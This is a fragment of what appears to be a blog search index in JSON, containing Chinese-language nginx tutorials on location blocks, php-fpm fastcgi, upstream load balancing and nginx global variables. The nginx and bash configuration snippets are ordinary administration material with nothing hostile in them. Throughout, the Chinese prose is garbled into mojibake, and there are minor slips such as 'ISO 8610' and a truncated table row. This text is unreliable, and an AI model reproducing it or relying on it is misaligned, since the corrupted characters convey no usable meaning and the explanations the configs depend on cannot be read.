files\n\n\n\n### 4.2 nginx å¿«é€Ÿé…ç½®æ•™ç¨‹\n\nhttps://nginx.org/en/docs/beginners_guide.html\n\n##### 4.2.1 å¦‚æœæœ‰å¤šä¸ªlocationæ¨¡å—, åŒ¹é…æœ€é•¿çš„\n\n```nginx\n    location / {\n            root /home/levonfly/www;\t#http://test.liuvv.com/\n    }\n\n    location /images/ { # è·¯å¾„æ˜¯ä¸¤è€…ç›¸åŠ /home/levonfly/images/\n            root /home/levonfly;\t#http://test.liuvv.com/images/1.png\n    }\n```\n\n##### 4.2.2 ä¸€ä¸ªnginxå®ä¾‹å¯ä»¥é€šè¿‡listenç›‘å¬ä¸åŒç«¯å£\n\n```nginx\nserver {\n    listen 8080;\n    root /home/levonfly/8080;  # locationæ²¡æœ‰root, å°±ç”¨è¿™é‡Œçš„root, ç»§æ‰¿å…³ç³»\n\n    location / {\n    }\n}\n\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        location / {\n                proxy_pass http://localhost:8080;\n        }\n        location /images/ {   \n                root /home/levonfly/; # http://test.liuvv.com/images/1.png\n        }\n  \n  \t    #location ~ \\.(gif|jpg|png)$ {  # 1.åˆ¤æ–­åç¼€ 2. æ³¢æµªçº¿æ˜¯æ­£åˆ™\n        #        root /home/levonfly/images; # http://test.liuvv.com/1.png\n        #}\n}\n```\n\n##### 4.2.3 fastcgiæ–¹å¼\n\nnginxæœ¬èº«ä¸èƒ½å¤„ç†phpï¼Œå®ƒåªæ˜¯ä¸ªwebæœåŠ¡å™¨ï¼Œå½“æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¦‚æœæ˜¯phpè¯·æ±‚ï¼Œåˆ™å‘ç»™phpè§£é‡Šå™¨å¤„ç†ï¼Œå¹¶æŠŠç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚nginxä¸€èˆ¬æ˜¯æŠŠè¯·æ±‚å‘fastcgiç®¡ç†è¿›ç¨‹å¤„ç†ï¼Œfascgiç®¡ç†è¿›ç¨‹é€‰æ‹©cgiå­è¿›ç¨‹å¤„ç†ç»“æœå¹¶è¿”å›ç»™nginx. php-fpmæ˜¯ä¸€ä¸ªphp fastcgiç®¡ç†å™¨, ç›®å‰ç›´æ¥é›†æˆåœ¨phpä¸­.\n\n\n\nå®‰è£…php:\n\n```bash\nsudo apt install php\nsudo systemctl restart php7.0-fpm.service\n```\n\nnginxé…ç½®:\n\n```nginx\nserver {\n        listen 80;\n        server_name *.liuvv.com;\n        root /home/levonfly/www;\n        index index.php index.html index.htm;\n  \n        location ~* \\.php$ {\n                fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n                include         fastcgi_params;\n                fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;\n                fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n        }\n}\n```\n\n### 4.3 è™šæ‹Ÿä¸»æœºé…ç½®\n\nnginx ä½¿ç”¨åŸŸåï¼Œä¸»è¦æ˜¯ä½¿ç”¨`server`æ¨¡å—ä¸‹çš„` server_name`é€‰é¡¹ã€‚\n\nå‚è€ƒ: http://www.liuvv.com/p/d039.html\n\n### 4.4 URLè·¯ç”±é‡å†™\n\nnginx ä½¿ç”¨url é‡å†™ï¼Œä¸»è¦æ˜¯ä½¿ç”¨`server`æ¨¡å—ä¸‹çš„` location`æ¨¡å—ã€‚\n\nå‚è€ƒ: http://www.liuvv.com/p/51e59d76.html\n\n### 4.5 åå‘ä»£ç†é…ç½®\n\nnginx ä½¿ç”¨åå‘ä»£ç†ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ `server`æ¨¡å—ä¸‹ `location`æ¨¡å—ä¸‹çš„`proxy_pass`é€‰é¡¹ã€‚\n\nå‚è€ƒ: http://www.liuvv.com/p/51e59d76.html\n\n### 4.6 è´Ÿè½½å‡è¡¡é…ç½®\n\nnginx ä½¿ç”¨åå‘ä»£ç†ï¼Œä¸»è¦æ˜¯ä½¿ç”¨`upstream`æ¨¡å—(å’Œserver å¹³çº§)ã€‚\n\nå‚è€ƒ: https://www.liuvv.com/p/4c38afcc.html\n\n\n\n# äº”. å‚è€ƒèµ„æ–™\n\n+ nginxçš„é…ç½®ã€è™šæ‹Ÿä¸»æœºã€è´Ÿè½½å‡è¡¡å’Œåå‘ä»£ç†\n\n  https://www.zybuluo.com/phper/note/89391  \n\n  https://www.zybuluo.com/phper/note/90310  \n\n  https://www.zybuluo.com/phper/note/133244  \n\n+ nginx é…ç½®è¯¦è§£\n\n  https://my.oschina.net/duxuefeng/blog/34880\n\n  http://www.nginx.cn/591.html \n\n  https://jkzhao.github.io/2018/01/23/Nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%E5%8F%8A%E4%BC%98%E5%8C%96 \n\n  https://www.kancloud.cn/curder/nginx/96672 \n\n+ åœ¨çº¿ç”Ÿæˆnginx é…ç½®\n\n   https://nginxconfig.io\n   \n+ nginx ä¼˜ç§€æ•™ç¨‹\n\n   https://xuexb.github.io/learn-nginx/example/  \n\n   https://www.kancloud.cn/hfpp2012/nginx-tutorial/467009\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginxé€šè¿‡upstreamå®ç°è´Ÿè½½å‡è¡¡","url":"%2Fp%2F4c38afcc.html","content":"\n\n\n### 1. nginx upstream è´Ÿè½½å‡è¡¡\n\nupstream æ¨¡å—è´Ÿå€ºè´Ÿè½½å‡è¡¡æ¨¡å—ï¼Œå¦‚æœNginxæ²¡æœ‰ä»…ä»…åªèƒ½ä»£ç†ä¸€å°æœåŠ¡å™¨çš„è¯ï¼Œé‚£å®ƒä¹Ÿä¸å¯èƒ½åƒä»Šå¤©è¿™ä¹ˆç«ï¼ŒNginxå¯ä»¥é…ç½®ä»£ç†å¤šå°æœåŠ¡å™¨ï¼Œå½“ä¸€å°æœåŠ¡å™¨å®•æœºä¹‹åï¼Œä»èƒ½ä¿æŒç³»ç»Ÿå¯ç”¨ã€‚å…·ä½“é…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n åœ¨httpèŠ‚ç‚¹ä¸‹ï¼Œæ·»åŠ upstreamèŠ‚ç‚¹ã€‚\n\n```nginx\nupstream levonfly { \n      server 10.0.6.108:7080; \n      server 10.0.0.85:8980; \n}\n```\n\nå°†serverèŠ‚ç‚¹ä¸‹çš„locationèŠ‚ç‚¹ä¸­çš„proxy_passé…ç½®ä¸ºï¼šhttp:// + upstreamåç§°ï¼Œå³\"http://levonfly\".\n\n```nginx\nlocation / { \n            root  html; \n            index  index.html index.htm; \n            proxy_pass http://levonfly; \n}\n```\n\nç°åœ¨è´Ÿè½½å‡è¡¡åˆæ­¥å®Œæˆäº†ã€‚upstreamæŒ‰ç…§è½®è¯¢ï¼ˆé»˜è®¤ï¼‰æ–¹å¼è¿›è¡Œè´Ÿè½½ï¼Œæ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æœåŠ¡å™¨downæ‰ï¼Œèƒ½è‡ªåŠ¨å‰”é™¤ã€‚è™½ç„¶è¿™ç§æ–¹å¼ç®€ä¾¿ã€æˆæœ¬ä½å»‰ã€‚\n<!-- more -->\n\n\n### 2. upstream è´Ÿè½½å‡è¡¡çš„æ¨¡å¼\n\nnginxçš„upstreamæ”¯æŒ5ç§åˆ†é…æ–¹å¼ï¼Œä¸‹é¢å°†ä¼šè¯¦ç»†ä»‹ç»ï¼Œå…¶ä¸­ï¼Œå‰ä¸‰ç§ä¸ºNginxåŸç”Ÿæ”¯æŒçš„åˆ†é…æ–¹å¼ï¼Œåä¸¤ç§ä¸ºç¬¬ä¸‰æ–¹æ”¯æŒçš„åˆ†é…æ–¹å¼ï¼š\n\n##### 2.1 è½®è¯¢(é»˜è®¤)\n\nè½®è¯¢æ˜¯upstreamçš„é»˜è®¤åˆ†é…æ–¹å¼ï¼Œå³æ¯ä¸ªè¯·æ±‚æŒ‰ç…§æ—¶é—´é¡ºåºè½®æµåˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœæŸä¸ªåç«¯æœåŠ¡å™¨downæ‰åï¼Œèƒ½è‡ªåŠ¨å‰”é™¤ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101:8888;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:8888;\n}\n```\n\n##### 2.2 weight        \n\nè½®è¯¢çš„åŠ å¼ºç‰ˆï¼Œå³å¯ä»¥æŒ‡å®šè½®è¯¢æ¯”ç‡ï¼Œweightå’Œè®¿é—®å‡ ç‡æˆæ­£æ¯”ï¼Œä¸»è¦åº”ç”¨äºåç«¯æœåŠ¡å™¨å¼‚è´¨çš„åœºæ™¯ä¸‹ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101 weight=1;\n  server 192.168.1.102 weight=2;\n  server 192.168.1.103 weight=3; # æ˜¯101è®¿é—®ç‡çš„3å€\n}\n```\n\n##### 2.3 ip_hash        \n\næ¯ä¸ªè¯·æ±‚æŒ‰ç…§è®¿é—®ipï¼ˆå³nginxçš„å‰ç½®æœåŠ¡å™¨æˆ–è€…å®¢æˆ·ç«¯IPï¼‰çš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¯ä¸ªè®¿å®¢ä¼šå›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessionä¸€è‡´é—®é¢˜ã€‚\n\n```nginx\nupstream backend {\n  ip_hash;\n  server 192.168.1.101:7777;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:9999;\n}\n```\n\n##### 2.4 fair(ç¬¬ä¸‰æ–¹) \n\nfairé¡¾åæ€ä¹‰ï¼Œå…¬å¹³åœ°æŒ‰ç…§åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´ï¼ˆrtï¼‰æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­å³rtå°çš„åç«¯æœåŠ¡å™¨ä¼˜å…ˆåˆ†é…è¯·æ±‚ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  fair;\n}\n```\n\n##### 2.5 url_hash(ç¬¬ä¸‰æ–¹)\n\nä¸ip_hashç±»ä¼¼ï¼Œä½†æ˜¯æŒ‰ç…§è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿å¾—æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œä¸»è¦åº”ç”¨äºåç«¯æœåŠ¡å™¨ä¸ºç¼“å­˜æ—¶çš„åœºæ™¯ä¸‹ã€‚\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  hash $request_uri;\n  hash_method crc32;\n}\n```\n\næ³¨æ„ï¼šåœ¨upstreamä¸­åŠ å…¥hashè¯­å¥ï¼Œserverè¯­å¥ä¸­ä¸èƒ½å†™å…¥weightç­‰å…¶ä»–çš„å‚æ•°ï¼Œhash_methodæ˜¯ä½¿ç”¨çš„hashç®—æ³•ã€‚\n\n\n\n### 3. upstream å…¶ä»–å‚æ•°\n\nupstreamä¸­serveræŒ‡ä»¤è¯­æ³•å¦‚ä¸‹ï¼š`server address [parameters]` ,  å…³é”®å­—serverå¿…é€‰, addressä¹Ÿå¿…é€‰ï¼Œå¯ä»¥æ˜¯ä¸»æœºåã€åŸŸåã€ipæˆ–unix socketï¼Œä¹Ÿå¯ä»¥æŒ‡å®šç«¯å£å·ã€‚\n\nupstreamè¿˜å¯ä»¥ä¸ºæ¯ä¸ªè®¾å¤‡è®¾ç½®çŠ¶æ€å€¼ï¼Œè¿™äº›çŠ¶æ€å€¼çš„å«ä¹‰åˆ†åˆ«å¦‚ä¸‹ï¼š\n\n+ down è¡¨ç¤ºå•å‰çš„serveræš‚æ—¶ä¸å‚ä¸è´Ÿè½½.\n\n+ weight é»˜è®¤ä¸º1.    weightè¶Šå¤§ï¼Œè´Ÿè½½çš„æƒé‡å°±è¶Šå¤§ã€‚\n\n+ max_fails ï¼šå…è®¸è¯·æ±‚å¤±è´¥çš„æ¬¡æ•°é»˜è®¤ä¸º1.å½“è¶…è¿‡æœ€å¤§æ¬¡æ•°æ—¶ï¼Œè¿”å›proxy_next_upstream æ¨¡å—å®šä¹‰çš„é”™è¯¯.\n\n+ fail_timeout : max_failsæ¬¡å¤±è´¥åï¼Œæš‚åœçš„æ—¶é—´ã€‚\n\n+ backupï¼š è¡¨ç¤ºå½“å‰serveræ˜¯å¤‡ç”¨æœåŠ¡å™¨ï¼Œåªæœ‰å…¶å®ƒébackupåç«¯æœåŠ¡å™¨éƒ½æŒ‚æ‰äº†æˆ–è€…å¾ˆå¿™æ‰ä¼šåˆ†é…åˆ°è¯·æ±‚ã€‚\n\n```nginx\nupstream bakend{ #å®šä¹‰è´Ÿè½½å‡è¡¡è®¾å¤‡çš„IpåŠè®¾å¤‡çŠ¶æ€ \n      ip_hash; \n      server 10.0.0.11:9090 down; \n      server 10.0.0.11:8080 weight=2; \n      server 10.0.0.11:6060; \n      server 10.0.0.11:7070 backup; \n}\n```\n\n##### 3.1 æ³¨æ„:\n\nmax_failså’Œfail_timeoutä¸€èˆ¬ä¼šå…³è”ä½¿ç”¨ï¼Œå¦‚æœæŸå°serveråœ¨fail_timeoutæ—¶é—´å†…å‡ºç°äº†max_failsæ¬¡è¿æ¥å¤±è´¥ï¼Œé‚£ä¹ˆNginxä¼šè®¤ä¸ºå…¶å·²ç»æŒ‚æ‰äº†ï¼Œä»è€Œåœ¨fail_timeoutæ—¶é—´å†…ä¸å†å»è¯·æ±‚å®ƒï¼Œfail_timeouté»˜è®¤æ˜¯10sï¼Œmax_failsé»˜è®¤æ˜¯1ï¼Œå³é»˜è®¤æƒ…å†µæ˜¯åªè¦å‘ç”Ÿé”™è¯¯å°±è®¤ä¸ºæœåŠ¡å™¨æŒ‚æ‰äº†ï¼Œå¦‚æœå°†max_failsè®¾ç½®ä¸º0ï¼Œåˆ™è¡¨ç¤ºå–æ¶ˆè¿™é¡¹æ£€æŸ¥ã€‚\n\n\n\n### 4. å®æˆ˜é…ç½®:\n\n````nginx\nupstream levonfly {\n    server 127.0.0.1:13050;\n}\n\nupstream testing-levonfly {\n    server 172.25.61.25:13050;\n}\n\n\nserver {\n    server_name levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n\nserver {\n    server_name test.levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://testing-levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n````\n\n##### 4.1 é‡åˆ°çš„é—®é¢˜:\n\n å¦‚æœä¸ç”Ÿæ•ˆ, æ³¨æ„ä¸‹ upstream çš„ç¼©è¿›ä¼šé€ æˆé—®é¢˜\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ http://www.linuxe.cn/post-182.html\n\n+ https://www.cnblogs.com/wzjhoutai/p/6932007.html\n\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginxå…¨å±€å˜é‡","url":"%2Fp%2F80b24c5f.html","content":"\n### 1. æœåŠ¡å™¨ç›¸å…³\n\n| å˜é‡å                | å¤‡æ³¨                                                         | ç¤ºä¾‹                                               |\n| --------------------- | ------------------------------------------------------------ | -------------------------------------------------- |\n| `nginx_version`       | å½“å‰è¿è¡Œçš„ Nginx ç‰ˆæœ¬å·                                      | 1.11.2                                             |\n| `server_port`         | æœåŠ¡å™¨ç«¯å£                                                   | 8080                                               |\n| `server_addr`         | æœåŠ¡å™¨ç«¯åœ°å€                                                 | 127.0.0.1                                          |\n| `server_name`         | æœåŠ¡å™¨åç§°                                                   | 127.0.0.1                                          |\n| `server_protocol`     | æœåŠ¡å™¨çš„HTTPç‰ˆæœ¬                                             | HTTP/1.0                                           |\n| `status`              | HTTP å“åº”ä»£ç                                                 | 200                                                |\n| `time_iso8601`        | æœåŠ¡å™¨æ—¶é—´çš„ ISO 8610 æ ¼å¼                                   | 2018-09-02T15:14:27+08:00                          |\n| `time_local`          | æœåŠ¡å™¨æ—¶é—´ï¼ˆLOG Format æ ¼å¼ï¼‰                                | 02/Sep/2018:15:14:27 +0800                         |\n| `document_root`       | å½“å‰è¯·æ±‚çš„æ–‡æ¡£æ ¹ç›®å½•æˆ–åˆ«å                                   | `/home/xiaowu/github/echo.xuexb.com`               |\n| `request_filename`    | å½“å‰è¿æ¥è¯·æ±‚çš„æ–‡ä»¶è·¯å¾„ï¼Œç”± `root`æˆ– `alias`æŒ‡ä»¤ä¸ URI è¯·æ±‚ç”Ÿæˆ | `/home/xiaowu/github/echo.xuexb.com/api/dump/path` |\n| `request_completion`  | å¦‚æœè¯·æ±‚æˆåŠŸï¼Œå€¼ä¸ºâ€OKâ€ï¼Œå¦‚æœè¯·æ±‚æœªå®Œæˆæˆ–è€…è¯·æ±‚ä¸æ˜¯ä¸€ä¸ªèŒƒå›´è¯·æ±‚çš„æœ€åä¸€éƒ¨åˆ†ï¼Œåˆ™ä¸ºç©º |                                                    |\n| `pid`                 | å·¥ä½œè¿›ç¨‹çš„PID                                                | 1234                                               |\n| `msec`                | å½“å‰çš„Unixæ—¶é—´æˆ³                                             | 1535872750.954                                     |\n| `limit_rate`          | ç”¨äºè®¾ç½®å“åº”çš„é€Ÿåº¦é™åˆ¶                                       | 0                                                  |\n| `pipe`                | å¦‚æœè¯·æ±‚æ¥è‡ªç®¡é“é€šä¿¡ï¼Œå€¼ä¸ºâ€œpâ€ï¼Œå¦åˆ™ä¸ºâ€œ.â€                     | .                                                  |\n| `connection_requests` | TCPè¿æ¥å½“å‰çš„è¯·æ±‚æ•°é‡                                        | 1                                                  |\n| `connection`          | TCP è¿æ¥çš„åºåˆ—å·                                             | 363861                                             |\n| `realpath_root`       | å½“å‰è¯·æ±‚çš„æ–‡æ¡£æ ¹ç›®å½•æˆ–åˆ«åçš„çœŸå®è·¯å¾„ï¼Œä¼šå°†æ‰€æœ‰ç¬¦å·è¿æ¥è½¬æ¢ä¸ºçœŸå®è·¯å¾„ | /home/xiaowu/github/echo.xuexb.com                 |\n|                       \n\n<!-- more -->\n\n### 2. å®¢æˆ·ç«¯ç›¸å…³\n\n| å˜é‡å              | ç¤ºä¾‹                                                         | å¤‡æ³¨                                                         |\n| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| host                | echo.xuexb.com                                               | ä¼˜å…ˆçº§å¦‚ä¸‹ï¼šHTTPè¯·æ±‚è¡Œçš„ä¸»æœºå>â€HOSTâ€è¯·æ±‚å¤´å­—æ®µ>ç¬¦åˆè¯·æ±‚çš„æœåŠ¡å™¨å |\n| hostname            | bj01                                                         | ä¸»æœºå                                                       |\n| remote_port         | 58500                                                        | å®¢æˆ·ç«¯ç«¯å£                                                   |\n| remote_user         |                                                              | ç”¨äºHTTPåŸºç¡€è®¤è¯æœåŠ¡çš„ç”¨æˆ·å                                 |\n| request             | GET /api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84%23123 HTTP/1.0 | ä»£è¡¨å®¢æˆ·ç«¯çš„è¯·æ±‚åœ°å€                                         |\n| remote_addr         | 127.0.0.1                                                    | å®¢æˆ·ç«¯åœ°å€                                                   |\n| request_body        |                                                              | å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸»ä½“, æ­¤å˜é‡å¯åœ¨locationä¸­ä½¿ç”¨ï¼Œå°†è¯·æ±‚ä¸»ä½“é€šè¿‡proxy_pass, fastcgi_pass, uwsgi_pass, å’Œ scgi_passä¼ é€’ç»™ä¸‹ä¸€çº§çš„ä»£ç†æœåŠ¡å™¨ |\n| request_body_file   |                                                              | å°†å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­æ–‡ä»¶å¤„ç†ç»“æŸåï¼Œæ­¤æ–‡ä»¶éœ€åˆ é™¤å¦‚æœéœ€è¦ä¹‹ä¸€å¼€å¯æ­¤åŠŸèƒ½ï¼Œéœ€è¦è®¾ç½®client_body_in_file_onlyå¦‚æœå°†æ¬¡æ–‡ä»¶ä¼ é€’ç»™åç«¯çš„ä»£ç†æœåŠ¡å™¨ï¼Œéœ€è¦ç¦ç”¨request bodyï¼Œå³è®¾ç½®proxy_pass_request_body offï¼Œfastcgi_pass_request_body off, uwsgi_pass_request_body off, or scgi_pass_request_body off |\n| proxy_protocol_addr |                                                              | è·å–ä»£ç†è®¿é—®æœåŠ¡å™¨çš„å®¢æˆ·ç«¯åœ°å€ï¼Œå¦‚æœæ˜¯ç›´æ¥è®¿é—®ï¼Œè¯¥å€¼ä¸ºç©ºå­—ç¬¦ä¸²(1.5.12) |\n| http_åç§°           | http_accept_language -> zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7  | åŒ¹é…ä»»æ„è¯·æ±‚å¤´å­—æ®µï¼› å˜é‡åä¸­çš„ååŠéƒ¨åˆ†â€œnameâ€å¯ä»¥æ›¿æ¢æˆä»»æ„è¯·æ±‚å¤´å­—æ®µï¼Œå¦‚åœ¨é…ç½®æ–‡ä»¶ä¸­éœ€è¦è·å–httpè¯·æ±‚å¤´ï¼šâ€œAccept-Languageâ€ï¼Œé‚£ä¹ˆå°†â€œï¼â€æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œå¤§å†™å­—æ¯æ›¿æ¢ä¸ºå°å†™ï¼Œå½¢å¦‚ï¼šhttp_accept_languageå³å¯ |\n| bytes_sent          | 0                                                            | ä¼ è¾“ç»™å®¢æˆ·ç«¯çš„å­—èŠ‚æ•° (1.3.8, 1.2.5)                          |\n| body_bytes_sent     | 0                                                            | ä¼ è¾“ç»™å®¢æˆ·ç«¯çš„å­—èŠ‚æ•°ï¼Œå“åº”å¤´ä¸è®¡ç®—åœ¨å†…ï¼›è¿™ä¸ªå˜é‡å’ŒApacheçš„mod_log_configæ¨¡å—ä¸­çš„â€œ%Bâ€å‚æ•°ä¿æŒå…¼å®¹ |\n\n\n\n### 3. å®¢æˆ·ç«¯ç›¸å…³ - request headers\n\n| å˜é‡å                           | å¤‡æ³¨                                                         | ç¤ºä¾‹                                                         |\n| -------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| `http_accept`                    | æµè§ˆå™¨æ”¯æŒçš„ MIME ç±»å‹                                       | `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8` |\n| `http_accept_encoding`           | æµè§ˆå™¨æ”¯æŒçš„å‹ç¼©ç¼–ç                                          | `gzip, deflate, br`                                          |\n| `http_accept_language`           | æµè§ˆå™¨æ”¯æŒçš„è¯­è¨€                                             | `zh-CN,zh;q=0.9,en;q=0.8`                                    |\n| `http_cache_control`             | æµè§ˆå™¨ç¼“å­˜                                                   | `max-age=0`                                                  |\n| `http_connection`                | å®¢æˆ·ç«¯ä¸æœåŠ¡è¿æ¥ç±»å‹                                         |                                                              |\n| `http_cookie`                    | æµè§ˆå™¨è¯·æ±‚ cookie                                            | `a=1; b=2`                                                   |\n| `http_host`                      | æµè§ˆå™¨è¯·æ±‚ host                                              | echo.xuexb.com                                               |\n| `http_referer`                   | æµè§ˆå™¨æ¥æº                                                   | https://echo.xuexb.com/                                      |\n| `http_upgrade_insecure_requests` | æ˜¯ä¸€ä¸ªè¯·æ±‚é¦–éƒ¨ï¼Œç”¨æ¥å‘æœåŠ¡å™¨ç«¯å‘é€ä¿¡å·ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯ä¼˜å…ˆé€‰æ‹©åŠ å¯†åŠå¸¦æœ‰èº«ä»½éªŒè¯çš„å“åº”ï¼Œå¹¶ä¸”å®ƒå¯ä»¥æˆåŠŸå¤„ç† upgrade-insecure-requests CSP æŒ‡ä»¤ | 1                                                            |\n| `http_user_agent`                | ç”¨æˆ·è®¾å¤‡æ ‡è¯†                                                 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36` |\n| `http_x_requested_with`          | å¼‚æ­¥è¯·æ±‚æ ‡è¯†                                                 | true                                                         |\n| `http_x_forwarded_for`           | åå‘ä»£ç†åŸ IP                                                | 198.13.61.105                                                |\n\n\n\n### 4. é“¾æ¥ç›¸å…³\n\n| å˜é‡å           | å¤‡æ³¨                                                         | ç¤ºä¾‹                                                       |\n| ---------------- | ------------------------------------------------------------ | ---------------------------------------------------------- |\n| `scheme`         | è¯·æ±‚ä½¿ç”¨çš„ WEB åè®®                                          | http                                                       |\n| `uri`            | è¯·æ±‚ä¸­çš„å½“å‰ URI(ä¸å¸¦è¯·æ±‚å‚æ•°)ï¼Œå¯ä»¥ä¸åŒäºæµè§ˆå™¨ä¼ é€’çš„ `$request_uri` çš„å€¼ï¼Œå®ƒå¯ä»¥é€šè¿‡å†…éƒ¨é‡å®šå‘ï¼Œæˆ–è€…ä½¿ç”¨ `index` æŒ‡ä»¤è¿›è¡Œä¿®æ”¹ | `/api/dump/path`                                           |\n| `document_uri`   | åŒ `$uri`                                                    | `/api/dump/path`                                           |\n| `request_uri`    | è¿™ä¸ªå˜é‡ç­‰äºåŒ…å«ä¸€äº›å®¢æˆ·ç«¯è¯·æ±‚å‚æ•°çš„åŸå§‹ URI ï¼Œå®ƒæ— æ³•ä¿®æ”¹    | `/api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84` |\n| `request_method` | HTTP è¯·æ±‚æ–¹æ³•                                                | GET                                                        |\n| `request_time`   | å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ä½¿ç”¨çš„æ—¶é—´ï¼Œä»è¯»å–å®¢æˆ·ç«¯çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹è®¡æ—¶   | 0.000                                                      |\n| `request_length` | è¯·æ±‚çš„é•¿åº¦ï¼ˆåŒ…æ‹¬è¯·æ±‚åœ°å€ã€è¯·æ±‚å¤´å’Œè¯·æ±‚ä¸»ä½“ï¼‰                 | 678                                                        |\n| `args`           | è¯·æ±‚å‚æ•°                                                     | `a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84`                |\n| `query_string`   | åŒ `$args`                                                   |                                                            |\n| `is_args`        | è¯·æ±‚ä¸­æ˜¯å¦æœ‰å‚æ•°ï¼Œæœ‰åˆ™ä¸º `?` å¦åˆ™ä¸ºç©º                        | `?`                                                        |\n| `arg_å‚æ•°å`     | è¯·æ±‚ä¸­å…·ä½“çš„å‚æ•°                                             | `$arg_a` => `1`                                            |\n| `https`          | å¦‚æœå¼€å¯äº† SSL å®‰å…¨æ¨¡å¼ï¼Œåˆ™ä¸º `on` å¦åˆ™ä¸ºç©º                  | `on`                                                       |\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ https://xuexb.github.io/learn-nginx/variable/\n+ https://nginx.org/en/docs/\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginxæ³›åŸŸåè§£æ","url":"%2Fp%2Fd039.html","content":"\n\n\n### 1. åŸŸåæ¦‚å¿µ\n\n##### 1.1 äºŒçº§åŸŸå\n\näºŒçº§åŸŸåæ˜¯æŒ‡é¡¶çº§åŸŸåä¹‹ä¸‹çš„åŸŸå, è§ä¸‹é¢çš„ä¾‹å­:\n\n- .com é¡¶çº§åŸŸå\n  - liuvv.com ä¸€çº§åŸŸå(ä½ èŠ±é’±ç”³è¯·çš„)\n    - www.liuvv.com äºŒçº§åŸŸå\n    - blog.liuvv.com äºŒçº§åŸŸå\n    - ä¾æ¬¡ç±»æ¨...\n\næœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ä¸‹:\n\n1. www.liuvv.comæ˜¯å±äºäºŒçº§åŸŸå,ä¸è¿‡ä¸€èˆ¬æˆ‘ä»¬æŠŠè¿™ä¸ªåŸŸåé…ç½®æŒ‡å‘ä¸€çº§åŸŸåè®¿é—®.\n2. 